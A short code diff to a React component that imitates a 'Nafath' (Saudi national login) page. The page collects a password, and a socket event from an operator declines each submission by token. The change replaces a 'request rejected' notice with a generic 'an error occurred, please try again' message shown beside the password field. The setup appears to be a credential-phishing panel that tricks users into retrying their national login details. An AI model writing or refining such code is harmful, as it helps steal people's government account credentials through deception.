@@ -56,7 +56,8 @@ const Navaz = () => {
   socket.on("declineNavaz", (info) => {
     if (info.token === token) {
       setPage(0);
-      setError("تم رفض الطلب");
+   
+            setError("حدث خطأ برجاء المحاولة مره أخري");
     }
   });
   return (
@@ -65,13 +66,6 @@ const Navaz = () => {
         نفاذ
       </span>
       <div className="w-full  my-3 py-3 flex flex-col items-center justify-center gap-y-3">
-        {error && (
-          <span className="w-full p-5 rounded-md border border-red-500 bg-red-100">
-            {" "}
-            تم رفض الطلب
-          </span>
-        )}
-
         {page === 0 ? (
           <form
             className="md:w-10/12 w-full flex flex-col bg-white py-8"
@@ -100,7 +94,12 @@ const Navaz = () => {
                 value={data.NavazPassword}
               />
             </div>
-
+            {error && (
+              <span className="w-full p-5 rounded-md border border-red-500 bg-red-100">
+                {" "}
+                {error}
+              </span>
+            )}
             <div className="w-full justify-center flex flex-col items-center">
               <button
                 className="flex items-center justify-center w-2/3 rounded-md text-white py-2 text-lg "
